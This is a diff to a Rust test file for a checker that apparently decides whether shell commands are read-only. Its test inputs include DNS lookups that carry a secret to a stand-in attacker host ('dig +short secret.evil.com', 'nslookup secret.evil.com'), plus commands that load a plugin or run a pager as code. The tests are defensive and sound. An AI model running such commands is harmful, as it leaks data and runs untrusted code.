@@ -464,6 +464,16 @@ fn arbitrary_execution_examples_are_not_read_only() {
         "cargo check",
         "cargo build",
         "cargo check --all-targets",
+        "cargo metadata",
+        "cargo tree",
+        "cargo --version",
+        "rustc --version",
+        "rustup show",
+        "kubectl get pods --kubeconfig=k.yaml",
+        "kubectl get pods -s https://x",
+        "nm --plugin ./x.so a.o",
+        "file -C -m magic",
+        "info -o out ls",
         "git grep -Osh x",
         "git grep --open-files-in-pager=sh x",
         "git grep -iO x",
@@ -569,10 +579,8 @@ fn writes_through_read_only_names_forfeit_it() {
         "yq .a f.yaml",
         "LC_ALL=C sort f",
         "TZ=UTC date",
-        "cargo metadata",
-        "cargo tree",
-        "cargo --version",
         "kubectl get pods",
+        "kubectl get pods -n kube-system -o yaml",
     ] {
         assert!(read_only(reads), "`{reads}` only reads");
     }
@@ -763,11 +771,13 @@ fn a_ps_that_prints_environments_is_not_read_only() {
 }
 
 #[test]
-fn dig_and_ping_reach_the_network_so_they_are_not_read_only() {
+fn commands_that_query_a_host_they_are_given_are_not_read_only() {
     for cmd in [
         "dig example.com",
         "dig +short secret.evil.com",
         "ping -c 1 example.com",
+        "nslookup secret.evil.com",
+        "traceroute evil.com",
     ] {
         assert!(!read_only(cmd), "`{cmd}`");
     }
